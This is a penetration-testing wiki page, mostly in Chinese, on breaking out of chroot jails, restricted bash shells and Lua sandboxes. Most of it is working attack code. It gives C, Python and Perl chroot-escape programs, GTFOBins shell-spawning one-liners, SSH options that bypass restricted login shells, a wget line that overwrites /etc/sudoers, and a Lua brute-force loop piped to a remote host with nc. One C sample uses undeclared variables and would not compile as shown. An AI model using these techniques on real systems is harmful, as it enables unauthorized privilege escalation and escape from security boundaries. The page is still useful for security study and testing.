# Escaping from Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**在** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **中搜索是否可以执行任何具有 "Shell" 属性的 binary**

## Chroot Escapes

来自 [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)：chroot 机制**并非用于防御**具有恶意篡改意图的**特权**（**root**）**用户**。在大多数系统中，chroot 上下文无法正确嵌套，具有**足够权限**的 chroot 程序**可能执行第二次 chroot 来逃逸**。\
通常，这意味着要 escape，你需要在 chroot 内成为 root。<sup>[[4]](#references)</sup>

> [!TIP]
> **工具** [**chw00t**](https://github.com/earthquake/chw00t) 的创建目的就是利用以下场景并从 `chroot` 中 escape。<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> 如果你在 chroot 内是 **root**，则可以通过创建**另一个 chroot** 来 **escape**。这是因为 2 个 chroot 无法共存（在 Linux 中），所以如果你创建一个文件夹，然后在你位于该新文件夹外部的情况下，在该文件夹上**创建一个新的 chroot**，那么你现在就会位于**新 chroot 的外部**，因此也就位于 FS 中。
>
> 这是因为通常 chroot 不会将你的工作目录移动到指定目录，所以你可以创建一个 chroot，但仍位于它的外部。<sup>[[4]](#references)[[5]](#references)</sup>

通常你不会在 chroot jail 中找到 `chroot` binary，但你**可以编译、上传并执行**一个 binary：

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> 这与前一种情况类似，但在本例中，**攻击者将当前目录的文件描述符存储起来**，然后**在一个新文件夹中创建 chroot**。最后，由于他在 chroot **外部**拥有对该 **FD** 的**访问权限**，因此可以访问它并**逃逸**。<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD 可以通过 Unix Domain Sockets 传递，因此：
>
> - 创建一个子进程（fork）
> - 创建 UDS，使父进程和子进程能够通信
> - 在子进程中对不同的目录运行 chroot
> - 在父进程中，为一个位于新子进程 chroot 外部的目录创建 FD
> - 使用 UDS 将该 FD 传递给子进程
> - 子进程对该 FD 执行 chdir，由于它位于自身 chroot 的外部，因此可以逃逸 jail。<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - 将 root device (/) 挂载到 chroot 内部的一个目录中
> - chroot 到该目录
>
> 这在 Linux 中是可行的。<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - 将 procfs 挂载到 chroot 内部的一个目录中（如果尚未挂载）
> - 查找具有不同 root/cwd 条目的 pid，例如：/proc/1/root
> - chroot 到该条目。<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - 创建一个 Fork（子进程），并 chroot 到 FS 中更深层的另一个目录，然后 CD 到该目录
> - 从父进程中，将子进程所在的目录移动到 children chroot 之前的一个目录中
> - 该 children 进程将发现自己位于 chroot 外部。<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - 进程能否使用 `ptrace` 附加取决于凭据、capabilities 以及 Yama 等已启用的 security modules；因此，同一用户的 debugging 可能会受到系统策略限制。<sup>[[8]](#references)</sup>
> - 如果允许附加，你可以 ptrace 进入某个进程，并在其中执行 shellcode（[see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)）。<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

获取有关 jail 的信息：
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### 修改 PATH

检查是否可以修改 PATH 环境变量。<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### 使用 vim

如果 Vim 可用，将其 `shell` 选项设置为一个你可以执行的 shell，然后调用 `:shell`。<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### 分页器和帮助查看器

许多受限环境仍然会提供**分页器**或**帮助查看器**。与尝试重新构建 `PATH` 相比，利用它们通常更快。
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
如果有可用的 `git`，其 `--paginate` 选项会将输出发送到 `less` 或 `$PAGER`；当 pager escape 可用时，这非常有用。<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### 常见的 GTFOBins 单行命令

确定哪些 binary 可访问后，先测试显而易见的 shell spawners：
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
如果你只能向允许的 command **注入参数**（而不是自由运行它），也请查看 **GTFOArgs**。<sup>[[17]](#references)</sup>

### 创建脚本

检查是否可以创建一个内容为 _/bin/bash_ 的可执行文件
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### 从 SSH 获取 bash

如果你通过 ssh 访问，通常可以要求服务器执行**不同的程序**，而不是受限的登录 shell。<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
如果 `ssh` 是本地少数允许使用的二进制文件之一，请记住它也可能被滥用为 **GTFOBin**；其 `LocalCommand` 和 `ProxyCommand` 选项会执行本地配置的辅助命令。<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### 声明

在 Bash 中，nameref 会将赋值重定向到另一个变量，而向 `BASH_CMDS` 添加元素会将该命令添加到 Bash 的内部命令哈希表中。<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Wget 的 `-O` 选项会将下载的内容写入指定的输出文件；如果该路径可写入，则可能覆盖诸如 `/etc/sudoers` 之类的文件。<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### 受限 shell wrappers（`git-shell`、`rssh`、`lshell`）

某些环境不会将你置于普通的 `rbash` 中，而是置于 **wrappers** 中，例如 `git-shell`、`rssh` 或 `lshell`：

- `git-shell` 只接受服务器端 Git 命令，以及 `~/git-shell-commands/` 中存在的任何内容。如果该目录存在，运行 `help` 以枚举允许的自定义操作。如果你可以在那里**写入**，则放入该目录的任何可执行文件都会变得可访问。<sup>[[3]](#references)</sup>
- `rssh` / `lshell` 通常只允许使用 `scp`、`sftp`、`rsync` 或 Git 风格的操作。在这些情况下，应首先关注**文件写入原语**：将 `authorized_keys`、shell 启动文件或辅助脚本上传到可写位置，然后使用 `ssh -t ...` 重新连接。
- 如果 wrapper 只过滤命令行，则枚举可访问的二进制文件，然后转向 **GTFOBins / GTFOArgs**。

### 其他技巧

另请检查：

- [**Fireshell Security - 受限 Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**以下页面也可能很有用：**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

以下页面介绍了 escaping from python jails 的技巧：


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

在此页面中，你可以找到在 lua 内部可访问的全局函数：[https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)。<sup>[[16]](#references)</sup>

如果可用，标准的 `load`、`string.char` 和 `os.execute` 函数可以构建并运行此代码块。<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
也可以使用 `rawget` 而不是点语法来获取表函数。<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
使用 `pairs` 枚举库表。<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
`pairs` 枚举表索引的顺序未指定，因此不要依赖某个特定函数首先出现。如果需要执行某个特定函数，可以通过加载不同的 lua 环境并调用库中的第一个函数来执行 brute force attack。<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**获取交互式 lua shell**：如果你处于受限的 lua shell 中，可以通过调用 `debug.debug()` 获取一个新的 lua shell（希望不再受限），该函数会进入交互模式。<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t：如何突破各种 chroot 方案（Bucsay Balazs，DeepSec 演讲和幻灯片）](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash 参考手册 – 受限 Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git 文档](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux 手册页](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – chroot 逃逸工具](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux 手册页](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux 手册页](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux 手册页](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git 文档](https://git-scm.com/docs/git)
- [10] [:shell – Vim 文档](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash 内置命令 – GNU Bash 参考手册](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash 变量 – GNU Bash 参考手册](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU Wget 手册](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD 手册页](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD 手册页](https://man.openbsd.org/ssh_config)
- [16] [Lua 5.4 参考手册](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs：参数注入利用向量列表](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
